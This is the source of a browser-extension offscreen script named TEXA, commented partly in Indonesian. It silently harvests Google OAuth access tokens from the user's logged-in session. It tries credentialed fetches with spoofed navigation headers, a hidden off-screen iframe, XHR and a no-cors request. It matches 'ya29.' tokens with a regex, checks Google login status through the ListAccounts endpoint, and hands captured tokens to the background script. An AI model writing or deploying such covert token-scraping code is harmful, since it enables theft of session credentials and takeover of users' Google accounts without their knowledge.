// =============================================
// TEXA Offscreen Document Script
// SILENT Token Scraping menggunakan Browser Google Session
// Enhanced with multiple fallback methods
// =============================================

const GOOGLE_LABS_URL = 'https://labs.google/fx/tools/flow';
const GOOGLE_LABS_URLS = [
    'https://labs.google/fx/tools/flow',
    'https://labs.google/fx/api/tools',
    'https://labs.google/fx',
    'https://labs.google/'
];
const TOKEN_REGEX = /ya29\.[a-zA-Z0-9_-]{100,}/g;

// Listen for messages from background script
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === 'OFFSCREEN_SCRAPE_TOKEN') {
        console.log('🔄 TEXA Offscreen: Starting enhanced silent scrape...');
        scrapeTokenEnhanced()
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true; // async response
    }

    if (message.type === 'OFFSCREEN_CHECK_LOGIN') {
        console.log('🔄 TEXA Offscreen: Checking Google login status...');
        checkGoogleLoginStatus()
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }
});

// Enhanced token scraping with multiple methods
async function scrapeTokenEnhanced() {
    console.log('🔄 TEXA Offscreen: Attempting multiple scrape methods...');

    // Method 1: Direct fetch with credentials
    for (const url of GOOGLE_LABS_URLS) {
        const result = await fetchWithBrowserSession(url);
        if (result.success) {
            console.log('✅ TEXA Offscreen: Token found via direct fetch!');
            return result;
        }
    }

    // Method 2: Try iframe injection (works for same-session cookies)
    const iframeResult = await scrapeViaIframe();
    if (iframeResult.success) {
        console.log('✅ TEXA Offscreen: Token found via iframe!');
        return iframeResult;
    }

    // Method 3: XMLHttpRequest with different headers
    const xhrResult = await fetchViaXHR(GOOGLE_LABS_URL);
    if (xhrResult.success) {
        console.log('✅ TEXA Offscreen: Token found via XHR!');
        return xhrResult;
    }

    // Method 4: Try without CORS mode
    const noCorsResult = await fetchNoCors();
    if (noCorsResult.success) {
        console.log('✅ TEXA Offscreen: Token found via no-cors!');
        return noCorsResult;
    }

    console.log('⚠️ TEXA Offscreen: All methods failed');
    return { success: false, error: 'Could not retrieve token - user may not be logged in to Google' };
}

// Method 1: Fetch using browser session cookies
async function fetchWithBrowserSession(url) {
    try {
        console.log(`🔄 TEXA Offscreen: Fetching ${url}...`);

        const response = await fetch(url, {
            method: 'GET',
            credentials: 'include',
            mode: 'cors',
            headers: {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document'
            },
            cache: 'no-store',
            redirect: 'follow'
        });

        console.log(`🔄 TEXA Offscreen: Response status ${response.status}, URL: ${response.url}`);

        // Check for login redirect
        if (response.url.includes('accounts.google.com')) {
            return { success: false, notLoggedIn: true, error: 'Redirected to login' };
        }

        if (!response.ok) {
            return { success: false, error: `HTTP ${response.status}` };
        }

        const html = await response.text();
        console.log(`🔄 TEXA Offscreen: Got ${html.length} chars`);

        // Check for login page content
        if (html.includes('accounts.google.com/ServiceLogin') ||
            html.includes('identifier-shown') ||
            html.includes('Sign in - Google Accounts')) {
            return { success: false, notLoggedIn: true, error: 'Login page detected' };
        }

        // Search for token
        const token = extractToken(html);
        if (token) {
            notifyTokenFound(token, 'Direct Fetch');
            return { success: true, token, method: 'direct_fetch' };
        }

        return { success: false, error: 'No token in response' };

    } catch (error) {
        console.log(`⚠️ TEXA Offscreen: Fetch error: ${error.message}`);
        return { success: false, error: error.message };
    }
}

// Method 2: Iframe injection to capture page content
async function scrapeViaIframe() {
    return new Promise((resolve) => {
        try {
            console.log('🔄 TEXA Offscreen: Creating iframe...');

            const iframe = document.createElement('iframe');
            iframe.style.cssText = 'width:1px;height:1px;position:absolute;top:-1000px;left:-1000px;visibility:hidden;';
            iframe.sandbox = 'allow-same-origin allow-scripts';
            iframe.src = GOOGLE_LABS_URL;

            let resolved = false;
            const timeout = setTimeout(() => {
                if (!resolved) {
                    resolved = true;
                    document.body.removeChild(iframe);
                    console.log('⚠️ TEXA Offscreen: Iframe timeout');
                    resolve({ success: false, error: 'Iframe timeout' });
                }
            }, 15000);

            iframe.onload = () => {
                setTimeout(() => {
                    if (resolved) return;

                    try {
                        // Try to access iframe content
                        const doc = iframe.contentDocument || iframe.contentWindow.document;
                        const html = doc.documentElement.outerHTML;

                        console.log(`🔄 TEXA Offscreen: Iframe loaded, ${html.length} chars`);

                        // Check if logged in
                        if (html.includes('accounts.google.com') || html.includes('Sign in')) {
                            resolved = true;
                            clearTimeout(timeout);
                            document.body.removeChild(iframe);
                            resolve({ success: false, notLoggedIn: true, error: 'Login required' });
                            return;
                        }

                        const token = extractToken(html);
                        resolved = true;
                        clearTimeout(timeout);
                        document.body.removeChild(iframe);

                        if (token) {
                            notifyTokenFound(token, 'Iframe Injection');
                            resolve({ success: true, token, method: 'iframe' });
                        } else {
                            resolve({ success: false, error: 'No token in iframe' });
                        }
                    } catch (e) {
                        // Cross-origin access denied
                        resolved = true;
                        clearTimeout(timeout);
                        try { document.body.removeChild(iframe); } catch (e2) { }
                        console.log('⚠️ TEXA Offscreen: Iframe cross-origin blocked');
                        resolve({ success: false, error: 'Cross-origin blocked' });
                    }
                }, 3000); // Wait for JS to execute
            };

            iframe.onerror = () => {
                if (!resolved) {
                    resolved = true;
                    clearTimeout(timeout);
                    try { document.body.removeChild(iframe); } catch (e) { }
                    resolve({ success: false, error: 'Iframe load error' });
                }
            };

            document.body.appendChild(iframe);

        } catch (e) {
            console.log('⚠️ TEXA Offscreen: Iframe creation error:', e.message);
            resolve({ success: false, error: e.message });
        }
    });
}

// Method 3: XMLHttpRequest with different handling
function fetchViaXHR(url) {
    return new Promise((resolve) => {
        console.log('🔄 TEXA Offscreen: Trying XHR...');

        const xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);
        xhr.withCredentials = true;
        xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml');

        xhr.onload = () => {
            if (xhr.status >= 200 && xhr.status < 300) {
                const html = xhr.responseText;
                console.log(`🔄 TEXA Offscreen: XHR got ${html.length} chars`);

                if (xhr.responseURL.includes('accounts.google.com')) {
                    resolve({ success: false, notLoggedIn: true, error: 'XHR redirected to login' });
                    return;
                }

                const token = extractToken(html);
                if (token) {
                    notifyTokenFound(token, 'XHR');
                    resolve({ success: true, token, method: 'xhr' });
                } else {
                    resolve({ success: false, error: 'No token in XHR response' });
                }
            } else {
                resolve({ success: false, error: `XHR status ${xhr.status}` });
            }
        };

        xhr.onerror = () => resolve({ success: false, error: 'XHR network error' });
        xhr.timeout = 15000;
        xhr.ontimeout = () => resolve({ success: false, error: 'XHR timeout' });
        xhr.send();
    });
}

// Method 4: Fetch without CORS (opaque response)
async function fetchNoCors() {
    try {
        console.log('🔄 TEXA Offscreen: Trying no-cors fetch...');

        // This won't give us the response body, but triggers the request
        // The token might be captured if there's a side effect
        const response = await fetch(GOOGLE_LABS_URL, {
            method: 'GET',
            credentials: 'include',
            mode: 'no-cors',
            cache: 'no-store'
        });

        // no-cors gives opaque response, can't read body
        // But we can check if network request happened
        console.log('🔄 TEXA Offscreen: no-cors request completed');

        return { success: false, error: 'no-cors cannot read response' };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// Extract token from HTML
function extractToken(html) {
    if (!html) return null;

    const matches = html.match(TOKEN_REGEX);
    if (matches && matches.length > 0) {
        // Get longest token (most complete)
        const token = matches.reduce((a, b) => a.length > b.length ? a : b);
        console.log(`🔄 TEXA Offscreen: Token found, length: ${token.length}`);
        return token;
    }

    return null;
}

// Notify background script of found token
function notifyTokenFound(token, source) {
    chrome.runtime.sendMessage({
        type: 'TEXA_TOKEN_FOUND',
        token: token,
        source: `Offscreen ${source}`
    });
}

// Check if user is logged in to Google
async function checkGoogleLoginStatus() {
    try {
        // Method 1: Check Google accounts endpoint
        const response = await fetch('https://accounts.google.com/ListAccounts?gpsia=1&source=ChromiumBrowser', {
            credentials: 'include',
            cache: 'no-store'
        });

        if (response.ok) {
            const text = await response.text();
            const hasAccounts = text.includes('@gmail.com') ||
                text.includes('@googlemail.com') ||
                text.includes('@') ||
                (text.length > 200 && !text.includes('Sign in'));

            console.log('🔄 TEXA Offscreen: Login status:', hasAccounts ? 'logged in' : 'not logged in');
            return { loggedIn: hasAccounts, method: 'accounts_check' };
        }

        // Method 2: Try Google My Account page
        const myAccountResp = await fetch('https://myaccount.google.com/', {
            credentials: 'include',
            method: 'HEAD'
        });

        const loggedIn = !myAccountResp.url.includes('accounts.google.com/ServiceLogin');
        return { loggedIn, method: 'myaccount_check' };

    } catch (error) {
        console.error('⚠️ TEXA Offscreen: Login check error:', error);
        return { loggedIn: false, error: error.message };
    }
}

console.log('🚀 TEXA Offscreen Document Loaded (Enhanced Silent Mode)');

